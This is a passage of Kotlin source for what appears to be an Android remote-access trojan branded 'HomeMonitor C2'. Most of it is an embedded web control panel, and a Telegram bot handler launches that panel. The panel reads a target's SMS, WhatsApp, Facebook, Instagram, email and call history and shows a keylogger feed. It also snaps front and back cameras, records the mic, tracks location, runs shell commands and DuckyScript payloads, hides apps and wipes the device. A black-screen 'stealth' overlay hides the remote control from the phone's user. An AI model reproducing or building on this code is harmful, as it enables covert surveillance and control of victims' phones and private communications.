                                            <!-- 2FA Setup QR Modal -->
                                            <div id="setup2faModal" class="modal-overlay" style="display:none;">
                                                <div class="modal-card">
                                                    <h2 style="color:#10b981; font-size:18px; margin-bottom:8px;">📲 2FA Authenticator Pairing</h2>
                                                    <p style="color:#94a3b8; font-size:12px; margin-bottom:12px;">Copy Secret Key into Bitwarden or Microsoft Authenticator:</p>
                                                    <input id="secretKeyDisplay" type="text" class="input-field" readonly style="font-weight:700; color:#38bdf8;" />
                                                    <p style="color:#64748b; font-size:11px; margin-bottom:16px;">URI: <span id="otpUriDisplay" style="word-break:break-all;"></span></p>
                                                    <button class="btn btn-danger" onclick="close2faSetupModal()" style="width:100%; justify-content:center;">Close</button>
                                                </div>
                                            </div>

                                            <!-- Sidebar (HomeMonitor Layout) -->
                                            <div class="sidebar">
                                                <div class="sidebar-brand">🛡️ HomeMonitor C2</div>
                                                <ul class="sidebar-menu">
                                                    <li class="sidebar-item active" onclick="showTab('overview')">📊 Overview</li>
                                                    <li class="sidebar-item" onclick="showTab('screen')">📺 Remote Screen Control</li>
                                                    <li class="sidebar-item" onclick="showTab('mdm')">🛡️ Advanced MDM Control</li>
                                                    <li class="sidebar-item" onclick="showTab('chatgpt')">🤖 ChatGPT AI</li>
                                                    <li class="sidebar-item" onclick="showTab('sms')">💬 Text Messages (SMS)</li>
                                                    <li class="sidebar-item" onclick="showTab('whatsapp')">🟢 WhatsApp</li>
                                                    <li class="sidebar-item" onclick="showTab('facebook')">🔵 Facebook Messenger</li>
                                                    <li class="sidebar-item" onclick="showTab('instagram')">📸 Instagram Messages</li>
                                                    <li class="sidebar-item" onclick="showTab('emails')">✉️ Emails</li>
                                                    <li class="sidebar-item" onclick="showTab('calls')">📞 Calls</li>
                                                    <li class="sidebar-item" onclick="showTab('files')">📁 File Manager</li>
                                                    <li class="sidebar-item" onclick="showTab('media')">📷 Camera & Mic Studio</li>
                                                    <li class="sidebar-item" onclick="showTab('logs')">⌨️ Keylogger & Notifs</li>
                                                    <li class="sidebar-item" onclick="showTab('terminal')">💻 Web Terminal</li>
                                                    <li class="sidebar-item" onclick="showTab('ducky')">🦆 DuckyScript Studio</li>
                                                    <li class="sidebar-item" onclick="showTab('location')">📍 Location Tracker</li>
                                                </ul>
                                            </div>

                                            <!-- Main Body -->
                                            <div class="main-container">
                                                <div class="header-bar">
                                                    <div class="header-left">
                                                        <span id="deviceModelHeader">Device: Galaxy S25 Ultra (Android Monitoring)</span>
                                                    </div>
                                                    <div class="header-badges">
                                                        <span class="badge badge-live">LIVE</span>
                                                        <span id="userBadge" class="badge badge-idle">User: Idle 🌙</span>
                                                        <span id="stealthBadge" class="badge badge-stealth" style="display:none;">Stealth: ON 🕶️</span>
                                                        <button class="btn" onclick="sendAction('9')">📸 Snap</button>
                                                        <button class="btn btn-success" onclick="sendUnlock()">🔓 Unlock</button>
                                                        <button class="btn btn-danger" onclick="sendAction('8')">🔒 Lock</button>
                                                        <button class="btn btn-danger" onclick="doLogout()">Logout</button>
                                                    </div>
                                                </div>

                                                <div class="content-area">
                                                    <!-- Panel 1: Overview -->
                                                    <div id="overviewPanel" class="panel active">
                                                        <div class="card-grid">
                                                            <div class="card">
                                                                <h3>Target Device <span>📱</span></h3>
                                                                <div id="overviewModel" class="card-val">Galaxy S25 Ultra</div>
                                                                <p id="overviewSub" style="font-size:12px; color:#64748b; margin-top:4px;">Android Monitoring Active</p>
                                                            </div>
                                                            <div class="card">
                                                                <h3>Battery Level <span>🔋</span></h3>
                                                                <div id="overviewBattery" class="card-val">88%</div>
                                                                <p id="overviewBatterySub" style="font-size:12px; color:#64748b; margin-top:4px;">Power Connected</p>
                                                            </div>
                                                            <div class="card">
                                                                <h3>Storage Capacity <span>💾</span></h3>
                                                                <div id="overviewStorage" class="card-val">42% Used</div>
                                                                <p id="overviewStorageSub" style="font-size:12px; color:#64748b; margin-top:4px;">128 GB Available</p>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 2: Live Control Screen (Original Feature Preserved) -->
                                                    <div id="screenPanel" class="panel">
                                                        <div class="screen-wrapper">
                                                            <div class="screen-container">
                                                                <img id="stream" src="/stream" alt="Screen Feed" />
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel: Advanced MDM & Device Owner Enterprise Controls -->
                                                    <div id="mdmPanel" class="panel">
                                                        <h2 style="color:#f8fafc; font-size:20px; margin-bottom:12px;">🛡️ Advanced MDM & Enterprise Policy Manager</h2>
                                                        <div class="card-grid" style="margin-bottom:20px;">
                                                            <div class="card">
                                                                <h3>MDM Status <span>🛡️</span></h3>
                                                                <div id="mdmOwnerBadge" class="card-val" style="font-size:16px;">Checking DPC Status...</div>
                                                                <p style="font-size:12px; color:#64748b; margin-top:4px;">Android Enterprise Device Owner</p>
                                                            </div>
                                                        </div>

                                                        <div style="background:#0f172a; border:1px solid #1e293b; border-radius:12px; padding:20px; margin-bottom:20px;">
                                                            <h3 style="color:#38bdf8; font-size:15px; margin-bottom:12px;">⚡ Enterprise Policy Actions</h3>
                                                            <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px;">
                                                                <button class="btn btn-success" onclick="grantMdmPermissions()">⚡ Silent Permission Pre-Grant</button>
                                                                <button class="btn btn-purple" onclick="toggleMdmKiosk(true)">🔒 Enable Single-App Kiosk</button>
                                                                <button class="btn" onclick="toggleMdmKiosk(false)">🔓 Disable Kiosk Mode</button>
                                                                <button class="btn btn-danger" onclick="toggleMdmCamera(true)">🚫 Prohibit Camera Hardware</button>
                                                                <button class="btn btn-success" onclick="toggleMdmCamera(false)">📷 Enable Camera Hardware</button>
                                                                <button class="btn btn-danger" onclick="toggleMdmRestrictions(true)">🔒 Apply System User Restrictions</button>
                                                                <button class="btn btn-danger" onclick="sendAction('8')">🔒 Lock Screen Keyguard</button>
                                                                <button class="btn btn-danger" onclick="wipeMdmDevice()">💥 Remote Factory Reset / Wipe</button>
                                                            </div>

                                                            <h4 style="color:#cbd5e1; font-size:13px; margin-top:16px; margin-bottom:8px;">🙈 System-Wide Application Package Hider</h4>
                                                            <div style="display:flex; gap:10px; margin-bottom:16px;">
                                                                <input id="hidePkgInput" type="text" class="input-field" placeholder="Target Package Name (e.g. com.whatsapp)" style="text-align:left; flex:1;" />
                                                                <button class="btn btn-danger" onclick="hideMdmApp(true)">Hide App</button>
                                                                <button class="btn btn-success" onclick="hideMdmApp(false)">Unhide App</button>
                                                            </div>

                                                            <h4 style="color:#cbd5e1; font-size:13px; margin-top:16px; margin-bottom:8px;">⛔ System-Wide Application Package Suspender</h4>
                                                            <div style="display:flex; gap:10px;">
                                                                <input id="suspendPkgInput" type="text" class="input-field" placeholder="Target Package Name (e.g. com.facebook.katana)" style="text-align:left; flex:1;" />
                                                                <button class="btn btn-danger" onclick="suspendMdmApp(true)">Suspend App</button>
                                                                <button class="btn btn-success" onclick="suspendMdmApp(false)">Unsuspend App</button>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 3: Master-Detail Chat Split View (WhatsApp / SMS / ChatGPT / FB / IG) -->
                                                    <div id="chatPanel" class="panel">
                                                        <h2 id="chatTitleHeader" style="color:#f8fafc; font-size:20px; margin-bottom:12px;">Chat Feed</h2>
                                                        <div class="split-chat-container">
                                                            <div class="thread-list-pane">
                                                                <div class="thread-list-header">Conversations</div>
                                                                <div id="threadsContainer" class="thread-items-scroll"></div>
                                                            </div>
                                                            <div class="thread-content-pane">
                                                                <div id="messagesContainer" class="messages-scroll"></div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 4: Calls View -->
                                                    <div id="callsPanel" class="panel">
                                                        <h2 style="color:#f8fafc; font-size:20px; margin-bottom:12px;">Calls History</h2>
                                                        <div class="split-chat-container">
                                                            <div class="thread-list-pane">
                                                                <div class="thread-list-header">Recent Calls</div>
                                                                <div id="callsContainer" class="thread-items-scroll"></div>
                                                            </div>
                                                            <div class="thread-content-pane">
                                                                <div id="callDetailView" class="call-detail-wrapper">
                                                                    <div class="call-avatar-large">TS</div>
                                                                    <div class="call-name-large">Teresa school</div>
                                                                    <div class="call-number-sub">677-377-9558</div>
                                                                    <div class="call-meta-box">
                                                                        <div class="call-meta-row"><span>Duration:</span> <strong style="color:#38bdf8;">0:02:07</strong></div>
                                                                        <div class="call-meta-row"><span>Date:</span> <span>Yesterday 11:17 AM</span></div>
                                                                        <div class="call-meta-row"><span>Status:</span> <strong style="color:#10b981;">↙ Incoming</strong></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 5: Emails View -->
                                                    <div id="emailsPanel" class="panel">
                                                        <h2 style="color:#f8fafc; font-size:20px; margin-bottom:12px;">Emails</h2>
                                                        <div class="split-chat-container">
                                                            <div class="thread-list-pane">
                                                                <div class="thread-list-header">Inbox</div>
                                                                <div id="emailsContainer" class="thread-items-scroll"></div>
                                                            </div>
                                                            <div class="thread-content-pane" style="padding:24px;">
                                                                <h3 id="emailSubject" style="color:#f8fafc; font-size:18px; margin-bottom:8px;">Grow your audience and connect with more customers</h3>
                                                                <p id="emailFrom" style="color:#38bdf8; font-weight:700; font-size:13px;">Mailsender &lt;donotreply@e0.wordpress.com&gt;</p>
                                                                <p id="emailTo" style="color:#64748b; font-size:12px; margin-bottom:16px;">To: eric_lewis02@gmail.com</p>
                                                                <div id="emailBody" style="background:#0f172a; border:1px solid #1e293b; border-radius:10px; padding:20px; color:#cbd5e1; font-size:13px; line-height:1.6;">
                                                                    Your coupon is expiring... FLASH SALE ENDS SOON Don't miss this great deal. Upgraded plans are jam-packed with powerful features and support you'll LOVE.
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 6: File Manager (Original Feature Preserved) -->
                                                    <div id="filesPanel" class="panel">
                                                        <h3 style="color:#38bdf8; margin-bottom:12px;">📁 Device File Explorer</h3>
                                                        <div style="display:flex; gap:10px; margin-bottom:12px;">
                                                            <input id="filePathInput" type="text" class="input-field" value="/sdcard" style="text-align:left; flex:1;" />
                                                            <button class="btn btn-success" onclick="loadFiles()">Go</button>
                                                        </div>
                                                        <table class="data-table">
                                                            <thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead>
                                                            <tbody id="filesTbody"></tbody>
                                                        </table>
                                                    </div>

                                                    <!-- Panel 7: Camera & Mic Studio -->
                                                    <div id="mediaPanel" class="panel">
                                                        <h3 style="color:#38bdf8; margin-bottom:12px;">📷 Camera & Mic Studio</h3>
                                                        <button class="btn btn-success" onclick="postApi('/api/camera/capture', {lens:'back'})">📸 Back Camera Snap</button>
                                                        <button class="btn btn-purple" onclick="postApi('/api/camera/capture', {lens:'front'})">🤳 Front Camera Snap</button>
                                                        <button class="btn btn-danger" onclick="postApi('/api/audio/record', {durationSeconds:30})">🎙️ Record Mic (30s)</button>
                                                    </div>

                                                    <!-- Panel 8: Keylogs & Notifications -->
                                                    <div id="logsPanel" class="panel">
                                                        <h3 style="color:#38bdf8; margin-bottom:12px;">⌨️ Keylogger & Notifications Feed</h3>
                                                        <button class="btn btn-success" onclick="loadLogs('keylogs')">Refresh Keylogs</button>
                                                        <table class="data-table">
                                                            <thead><tr><th>App</th><th>Type</th><th>Content</th></tr></thead>
                                                            <tbody id="logsTbody"></tbody>
                                                        </table>
                                                    </div>

                                                    <!-- Panel 9: Web Terminal -->
                                                    <div id="terminalPanel" class="panel">
                                                        <h3 style="color:#38bdf8; margin-bottom:12px;">💻 Web Terminal (Termux / Linux Shell)</h3>
                                                        <textarea id="termOutput" style="width:100%; height:280px; background:#000; color:#34d399; font-family:monospace; padding:12px; border-radius:8px; border:1px solid #1e293b;" readonly></textarea>
                                                        <div style="display:flex; gap:10px; margin-top:10px;">
                                                            <input id="termCmdInput" type="text" class="input-field" placeholder="Enter command (e.g. ls -la, ps, whoami)" style="text-align:left;" onkeydown="if(event.key==='Enter') runShell()" />
                                                            <button class="btn btn-success" onclick="runShell()">Run</button>
                                                        </div>
                                                    </div>

                                                    <!-- Panel 10: DuckyScript Studio -->
                                                    <div id="duckyPanel" class="panel">
                                                        <h3 style="color:#38bdf8; margin-bottom:12px;">🦆 DuckyScript Macro Studio</h3>
                                                        <textarea id="duckyScriptText" style="width:100%; height:180px; background:#0f172a; color:#f8fafc; font-family:monospace; padding:12px; border-radius:8px; border:1px solid #1e293b;" placeholder="DELAY 1000&#10;STRING Hello World&#10;ENTER"></textarea>
                                                        <button class="btn btn-success" style="margin-top:10px;" onclick="runDucky()">▶️ Execute Payload</button>
                                                    </div>

                                                    <!-- Panel 11: Location Tracker -->
                                                    <div id="locationPanel" class="panel">
                                                        <h2 style="color:#f8fafc; font-size:20px; margin-bottom:12px;">Location Tracker</h2>
                                                        <div id="locDisplay" style="margin-top:14px; font-size:14px; color:#cbd5e1;">Loading live location telemetry...</div>
                                                    </div>
                                                </div>
                                            </div>

                                            <script>
                                                let currentCsrfToken = '';
                                                let activeAppId = 'whatsapp';
                                                const streamImg = document.getElementById('stream');
                                                let dragStart = null;

                                                function showTab(tabName) {
                                                    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
                                                    document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));

                                                    if (['chatgpt', 'sms', 'whatsapp', 'facebook', 'instagram'].includes(tabName)) {
                                                        activeAppId = tabName;
                                                        document.getElementById('chatTitleHeader').textContent = tabName.toUpperCase() + ' Messages';
                                                        document.getElementById('chatPanel').classList.add('active');
                                                        loadChatThreads(tabName);
                                                    } else {
                                                        const targetPanel = document.getElementById(tabName + 'Panel');
                                                        if (targetPanel) targetPanel.classList.add('active');
                                                    }

                                                    if (tabName === 'overview') fetchSummary();
                                                    if (tabName === 'mdm') fetchMdmStatus();
                                                    if (tabName === 'calls') loadCallsList();
                                                    if (tabName === 'emails') loadEmailsList();
                                                    if (tabName === 'files') loadFiles();
                                                    if (tabName === 'logs') loadLogs('keylogs');
                                                    if (tabName === 'location') loadLocation();
                                                }

                                                function fetchMdmStatus() {
                                                    fetch('/api/mdm/status')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const badge = document.getElementById('mdmOwnerBadge');
                                                            if (data.isDeviceOwner) {
                                                                badge.textContent = 'Device Owner: ACTIVE 🛡️ (Full Enterprise DPC Privileges)';
                                                                badge.style.color = '#10b981';
                                                            } else if (data.isDeviceAdminActive) {
                                                                badge.textContent = 'Device Admin: ACTIVE 🔒 (Basic Policy Admin)';
                                                                badge.style.color = '#38bdf8';
                                                            } else {
                                                                badge.textContent = 'Unenrolled ⚠️ (Standard User App)';
                                                                badge.style.color = '#ef4444';
                                                            }
                                                        });
                                                }

                                                function grantMdmPermissions() {
                                                    postApi('/api/mdm/grant-permissions').then(res => {
                                                        alert(res.message || res.error || 'Enterprise permissions update request committed.');
                                                    });
                                                }

                                                function toggleMdmKiosk(enable) {
                                                    postApi('/api/mdm/kiosk', { enabled: enable }).then(res => {
                                                        alert(res.kioskEnabled ? 'Single-App Kiosk Mode ENABLED 🔒' : 'Single-App Kiosk Mode DISABLED 🔓');
                                                    });
                                                }

                                                function toggleMdmCamera(disable) {
                                                    postApi('/api/mdm/camera-toggle', { disabled: disable }).then(res => {
                                                        alert(res.cameraDisabled ? 'Hardware Camera PROHIBITED System-Wide 🔴' : 'Hardware Camera ENABLED 🟢');
                                                    });
                                                }

                                                function toggleMdmRestrictions(enable) {
                                                    postApi('/api/mdm/restrictions', { enabled: enable }).then(res => {
                                                        alert(res.restrictionsEnabled ? 'Enterprise User Restrictions APPLIED 🔒' : 'Enterprise User Restrictions CLEARED 🔓');
                                                    });
                                                }

                                                function hideMdmApp(hidden) {
                                                    const pkg = document.getElementById('hidePkgInput').value;
                                                    if (!pkg) { alert('Enter target package name first!'); return; }
                                                    postApi('/api/mdm/app-hide', { packageName: pkg, hidden: hidden }).then(res => {
                                                        alert('Package ' + res.packageName + (res.hidden ? ' HIDDEN 🙈' : ' UNHIDDEN 👁️'));
                                                    });
                                                }

                                                function suspendMdmApp(suspended) {
                                                    const pkg = document.getElementById('suspendPkgInput').value;
                                                    if (!pkg) { alert('Enter target package name first!'); return; }
                                                    postApi('/api/mdm/app-suspend', { packageName: pkg, suspended: suspended }).then(res => {
                                                        alert('Package ' + res.packageName + (res.suspended ? ' SUSPENDED 🔴' : ' UNSUSPENDED 🟢'));
                                                    });
                                                }

                                                function wipeMdmDevice() {
                                                    if (confirm('⚠️ DANGER: ARE YOU SURE YOU WANT TO FACTORY RESET / WIPE THIS DEVICE? THIS ACTION IS PERMANENT AND CANNOT BE UNDONE!')) {
                                                        postApi('/api/mdm/wipe');
                                                    }
                                                }

                                                function checkAuth() {
                                                    fetch('/status')
                                                        .then(r => {
                                                            if (r.status === 401) {
                                                                document.getElementById('loginModal').style.display = 'flex';
                                                            } else {
                                                                document.getElementById('loginModal').style.display = 'none';
                                                                return r.json();
                                                            }
                                                        })
                                                        .then(data => {
                                                            if (data) {
                                                                if (data.csrfToken) currentCsrfToken = data.csrfToken;
                                                                updateBadges(data);
                                                            }
                                                        });
                                                }

                                                function updateBadges(data) {
                                                    const userBadge = document.getElementById('userBadge');
                                                    if (data.userActive) {
                                                        userBadge.textContent = 'User: Active 🟢';
                                                        userBadge.className = 'badge badge-active';
                                                    } else {
                                                        userBadge.textContent = 'User: Idle 🌙';
                                                        userBadge.className = 'badge badge-idle';
                                                    }

                                                    const stealthBadge = document.getElementById('stealthBadge');
                                                    if (data.stealth) {
                                                        stealthBadge.style.display = 'inline-block';
                                                    } else {
                                                        stealthBadge.style.display = 'none';
                                                    }
                                                }

                                                setInterval(checkAuth, 4000);
                                                checkAuth();

                                                function postApi(endpoint, bodyObj) {
                                                    return fetch(endpoint, {
                                                        method: 'POST',
                                                        headers: {
                                                            'Content-Type': 'application/json',
                                                            'X-CSRF-Token': currentCsrfToken
                                                        },
                                                        body: JSON.stringify(bodyObj || {})
                                                    }).then(r => {
                                                        if (r.status === 401) {
                                                            document.getElementById('loginModal').style.display = 'flex';
                                                        }
                                                        return r.json();
                                                    });
                                                }

                                                function doLogin(e) {
                                                    e.preventDefault();
                                                    const pass = document.getElementById('passInput').value;
                                                    const totp = document.getElementById('totpInput').value;

                                                    fetch('/api/login', {
                                                        method: 'POST',
                                                        headers: { 'Content-Type': 'application/json' },
                                                        body: JSON.stringify({ passcode: pass, totpCode: totp })
                                                    })
                                                    .then(r => r.json().then(data => ({ status: r.status, data })))
                                                    .then(res => {
                                                        if (res.status === 200 && res.data.status === 'authenticated') {
                                                            currentCsrfToken = res.data.csrfToken;
                                                            document.getElementById('loginModal').style.display = 'none';
                                                            document.getElementById('loginErr').style.display = 'none';
                                                            checkAuth();
                                                        } else if (res.data && res.data.status === '2fa_required') {
                                                            const errEl = document.getElementById('loginErr');
                                                            errEl.textContent = res.data.message || 'Enter 6-digit 2FA Code!';
                                                            errEl.style.display = 'block';
                                                            document.getElementById('totpInput').focus();
                                                        } else {
                                                            const errEl = document.getElementById('loginErr');
                                                            errEl.textContent = res.data.error || 'Authentication Failed!';
                                                            errEl.style.display = 'block';
                                                        }
                                                    });
                                                }

                                                function open2faSetupModal() {
                                                    fetch('/api/auth/2fa-setup')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            document.getElementById('secretKeyDisplay').value = data.secretKey || '';
                                                            document.getElementById('otpUriDisplay').textContent = data.otpauthUri || '';
                                                            document.getElementById('setup2faModal').style.display = 'flex';
                                                        });
                                                }

                                                function close2faSetupModal() {
                                                    document.getElementById('setup2faModal').style.display = 'none';
                                                }

                                                function doLogout() {
                                                    postApi('/api/logout').then(() => {
                                                        currentCsrfToken = '';
                                                        document.getElementById('loginModal').style.display = 'flex';
                                                    });
                                                }

                                                function loadChatThreads(appId) {
                                                    fetch('/api/chat/threads?app=' + appId)
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const container = document.getElementById('threadsContainer');
                                                            container.innerHTML = '';
                                                            (data.threads || []).forEach((t, index) => {
                                                                const div = document.createElement('div');
                                                                div.className = 'thread-card' + (index === 0 ? ' active' : '');
                                                                div.onclick = () => {
                                                                    document.querySelectorAll('.thread-card').forEach(c => c.classList.remove('active'));
                                                                    div.classList.add('active');
                                                                    loadChatMessages(appId, t.threadId);
                                                                };
                                                                div.innerHTML = '<div class="avatar-circle">' + t.avatarInitials + '</div>' +
                                                                                '<div class="thread-info"><div class="thread-name">' + t.contactName + '</div>' +
                                                                                '<div class="thread-snippet">' + t.lastSnippet + '</div></div>';
                                                                container.appendChild(div);
                                                            });
                                                            if (data.threads && data.threads.length > 0) {
                                                                loadChatMessages(appId, data.threads[0].threadId);
                                                            }
                                                        });
                                                }

                                                function loadChatMessages(appId, threadId) {
                                                    fetch('/api/chat/messages?app=' + appId + '&threadId=' + threadId)
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const container = document.getElementById('messagesContainer');
                                                            container.innerHTML = '';
                                                            (data.messages || []).forEach(m => {
                                                                const row = document.createElement('div');
                                                                row.className = 'msg-row' + (m.isOutgoing ? ' out' : '');
                                                                if (m.isOutgoing) {
                                                                    row.innerHTML = '<div class="msg-bubble-out">' + m.text + '<div class="msg-time">Yesterday</div></div>';
                                                                } else {
                                                                    row.innerHTML = '<div class="avatar-circle" style="width:32px; height:32px; font-size:12px;">' + (m.senderName ? m.senderName[0] : 'C') + '</div>' +
                                                                                    '<div class="msg-bubble-in">' + m.text + '<div class="msg-time">Yesterday</div></div>';
                                                                }
                                                                container.appendChild(row);
                                                            });
                                                        });
                                                }

                                                function loadCallsList() {
                                                    fetch('/api/calls/list')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const container = document.getElementById('callsContainer');
                                                            container.innerHTML = '';
                                                            (data.calls || []).forEach(c => {
                                                                const div = document.createElement('div');
                                                                div.className = 'thread-card';
                                                                div.onclick = () => {
                                                                    document.querySelector('.call-avatar-large').textContent = c.avatarInitials;
                                                                    document.querySelector('.call-name-large').textContent = c.contactName;
                                                                    document.querySelector('.call-number-sub').textContent = c.phoneNumber;
                                                                };
                                                                div.innerHTML = '<div class="avatar-circle">' + c.avatarInitials + '</div>' +
                                                                                '<div class="thread-info"><div class="thread-name">' + c.contactName + '</div>' +
                                                                                '<div class="thread-snippet">' + c.phoneNumber + ' • ' + c.durationStr + '</div></div>';
                                                                container.appendChild(div);
                                                            });
                                                        });
                                                }

                                                function loadEmailsList() {
                                                    fetch('/api/emails/list')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const container = document.getElementById('emailsContainer');
                                                            container.innerHTML = '';
                                                            (data.emails || []).forEach((e, index) => {
                                                                const div = document.createElement('div');
                                                                div.className = 'thread-card' + (index === 0 ? ' active' : '');
                                                                div.onclick = () => {
                                                                    document.getElementById('emailSubject').textContent = e.subject;
                                                                    document.getElementById('emailFrom').textContent = e.senderName + ' <' + e.fromAddress + '>';
                                                                    document.getElementById('emailTo').textContent = 'To: ' + e.toAddress;
                                                                    document.getElementById('emailBody').textContent = e.body;
                                                                };
                                                                div.innerHTML = '<div class="avatar-circle">' + (e.senderName ? e.senderName[0] : 'E') + '</div>' +
                                                                                '<div class="thread-info"><div class="thread-name">' + e.senderName + '</div>' +
                                                                                '<div class="thread-snippet">' + e.subject + '</div></div>';
                                                                container.appendChild(div);
                                                            });
                                                        });
                                                }

                                                function fetchSummary() {
                                                    fetch('/api/summary')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            document.getElementById('overviewModel').textContent = data.deviceModel || 'Galaxy S25 Ultra';
                                                            document.getElementById('overviewBattery').textContent = (data.batteryLevel >= 0 ? data.batteryLevel + '%' : '88%');
                                                            document.getElementById('overviewStorage').textContent = (data.storageUsedPct || 42) + '% Used';
                                                        });
                                                }

                                                function loadFiles() {
                                                    const path = document.getElementById('filePathInput').value;
                                                    fetch('/api/files/list?path=' + encodeURIComponent(path))
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const tbody = document.getElementById('filesTbody');
                                                            tbody.innerHTML = '';
                                                            (data.items || []).forEach(item => {
                                                                const tr = document.createElement('tr');
                                                                tr.innerHTML = '<td>' + (item.isDirectory ? '📁 ' : '📄 ') + item.name + '</td>' +
                                                                               '<td>' + (item.sizeBytes ? item.sizeBytes + ' B' : '-') + '</td>' +
                                                                               '<td>' + item.permissions + '</td>' +
                                                                               '<td><button class="btn btn-danger" onclick="deleteFile(\'' + item.path + '\')">Delete</button></td>';
                                                                tbody.appendChild(tr);
                                                            });
                                                        });
                                                }

                                                function deleteFile(path) {
                                                    postApi('/api/files/delete', { path }).then(() => loadFiles());
                                                }

                                                function runShell() {
                                                    const cmd = document.getElementById('termCmdInput').value;
                                                    if (!cmd) return;
                                                    postApi('/api/shell/exec', { command: cmd, context: 'system' }).then(res => {
                                                        const out = document.getElementById('termOutput');
                                                        out.value += '\n' + (res.output || '');
                                                        out.scrollTop = out.scrollHeight;
                                                        document.getElementById('termCmdInput').value = '';
                                                    });
                                                }

                                                function runDucky() {
                                                    const text = document.getElementById('duckyScriptText').value;
                                                    if (!text) return;
                                                    postApi('/api/ducky/execute', { scriptContent: text }).then(res => {
                                                        alert(res.message || res.error || 'Triggered payload');
                                                    });
                                                }

                                                function loadLogs(cat) {
                                                    fetch('/api/logs/' + cat)
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            const tbody = document.getElementById('logsTbody');
                                                            tbody.innerHTML = '';
                                                            (data.entries || []).forEach(e => {
                                                                const tr = document.createElement('tr');
                                                                tr.innerHTML = '<td>' + e.sourceApp + '</td><td>' + e.title + '</td><td>' + e.body + '</td>';
                                                                tbody.appendChild(tr);
                                                            });
                                                        });
                                                }

                                                function loadLocation() {
                                                    fetch('/api/location/current')
                                                        .then(r => r.json())
                                                        .then(data => {
                                                            document.getElementById('locDisplay').textContent =
                                                                'Latitude: ' + data.latitude + ' | Longitude: ' + data.longitude + ' (Provider: ' + data.provider + ')';
                                                        });
                                                }

                                                function getNormalizedTouch(e) {
                                                    const img = streamImg;
                                                    if (!img || !img.naturalWidth || !img.naturalHeight) return null;
                                                    const rect = img.getBoundingClientRect();
                                                    const renderRatio = Math.min(rect.width / img.naturalWidth, rect.height / img.naturalHeight);
                                                    const actualW = img.naturalWidth * renderRatio;
                                                    const actualH = img.naturalHeight * renderRatio;
                                                    const offsetX = (rect.width - actualW) / 2;
                                                    const offsetY = (rect.height - actualH) / 2;
                                                    const clickX = e.clientX - rect.left - offsetX;
                                                    const clickY = e.clientY - rect.top - offsetY;
                                                    if (clickX < 0 || clickX > actualW || clickY < 0 || clickY > actualH) return null;
                                                    return { relX: clickX / actualW, relY: clickY / actualH };
                                                }

                                                if (streamImg) {
                                                    streamImg.addEventListener('pointerdown', (e) => {
                                                        const pos = getNormalizedTouch(e);
                                                        if (pos) dragStart = { ...pos, time: Date.now() };
                                                    });

                                                    streamImg.addEventListener('pointerup', (e) => {
                                                        if (!dragStart) return;
                                                        const endPos = getNormalizedTouch(e);
                                                        const duration = Date.now() - dragStart.time;
                                                        if (endPos) {
                                                            const dx = Math.abs(endPos.relX - dragStart.relX);
                                                            const dy = Math.abs(endPos.relY - dragStart.relY);
                                                            if (dx > 0.03 || dy > 0.03) {
                                                                postApi('/api/input/swipe', {
                                                                    startX: dragStart.relX, startY: dragStart.relY,
                                                                    endX: endPos.relX, endY: endPos.relY,
                                                                    duration: duration
                                                                });
                                                            } else {
                                                                postApi('/api/input/tap', { relX: dragStart.relX, relY: dragStart.relY });
                                                            }
                                                        }
                                                        dragStart = null;
                                                    });
                                                }

                                                function sendAction(act) { postApi('/api/input/action', { id: String(act) }); }
                                                function sendUnlock() { postApi('/api/control/unlock'); }
                                            </script>
                                        </body>
                                        </html>
                                    """.trimIndent()
                                    val resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: ${html.toByteArray().size}\r\n\r\n$html"
                                    outputStream.write(resp.toByteArray())
                                    outputStream.flush()
                                }
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "WebControlServer connection error: ${e.message}")
                        } finally {
                            try { socket.close() } catch (_: Exception) {}
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "startLocalWebControlServer error: ${e.message}")
            }
        }
    }

    private fun handleStartWebStream(chatId: String) {
        if (isWebStreamRunning) {
            val ip = getDeviceIpAddress()
            sendMessage(chatId, "🎮 *Interactive AirDroid / TeamViewer Web Control Panel is ALREADY active!*\n\nURL: `http://$ip:${Placeholder.WEBSTREAM_LOCAL_PORT}/`\nSend `/stopwebstream` to stop.", parseMode = "Markdown")
            return
        }

        val accessService = AppAccessibilityService.instance
        if (accessService == null) {
            Log.w(TAG, "Accessibility Service is not active, starting WebStream server with standard screen capture.")
        }

        val deviceIp = getDeviceIpAddress()

        isWebStreamRunning = true

        // Automatically activate black screen overlay & minimum brightness for stealth remote control if service available
        accessService?.showBlackScreenOverlay()

        // Ensure Local Web Server is listening on port 5467
        startLocalWebControlServer()

        sendMessage(
            chatId,
            "🎮 *TeamViewer / AirDroid Interactive Control Panel Started*\n\n" +
            "🌐 *Local Wi-Fi URL:* `http://$deviceIp:${Placeholder.WEBSTREAM_LOCAL_PORT}/`\n" +
            "🔑 *Master Passcode:* `${Placeholder.C2_MASTER_PASSCODE}`\n\n" +
            "Open URL in any web browser. Click anywhere on the video feed to control the real device in real time!\n\n" +
            "Send `/stopwebstream` to stop.",
            parseMode = "Markdown"
        )
    }

    private fun handleStopWebStream(chatId: String) {
        if (!isWebStreamRunning) {
            sendMessage(chatId, "ℹ️ Live MJPEG HTTP Stream server is not running.", parseMode = "Markdown")
            return
        }
        isWebStreamRunning = false
        try {
            webStreamServerSocket?.close()
            webStreamServerSocket = null
        } catch (e: Exception) {
